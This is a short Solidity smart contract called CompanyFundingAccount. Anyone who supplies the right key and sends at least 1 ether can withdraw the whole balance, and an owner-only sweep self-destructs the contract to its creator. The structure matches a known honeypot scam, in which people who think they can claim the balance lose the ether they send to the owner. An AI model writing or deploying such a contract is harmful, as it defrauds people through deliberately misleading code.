1 pragma solidity ^0.4.25;
2 
3 contract CompanyFundingAccount
4 {
5     bytes32 keyHash;
6     address owner;
7 
8     constructor() public {
9         owner = msg.sender;
10     }
11 
12     function withdraw(string key) public payable
13     {
14         require(msg.sender == tx.origin);
15         if(keyHash == keccak256(abi.encodePacked(key))) {
16             //Prevent brute force
17             if(msg.value >= 1 ether) {
18                 msg.sender.transfer(address(this).balance);
19             }
20         }
21     }
22 
23     function setup(string key) public
24     {
25         if (keyHash == 0x0) {
26             keyHash = keccak256(abi.encodePacked(key));
27         }
28     }
29 
30     function update(bytes32 _keyHash) public
31     {
32         if (keyHash == 0x0) {
33             keyHash = _keyHash;
34         }
35     }
36 
37     function sweep() public
38     {
39         require(msg.sender == owner);
40         selfdestruct(owner);
41     }
42 
43     function () public payable {
44 
45     }
46 }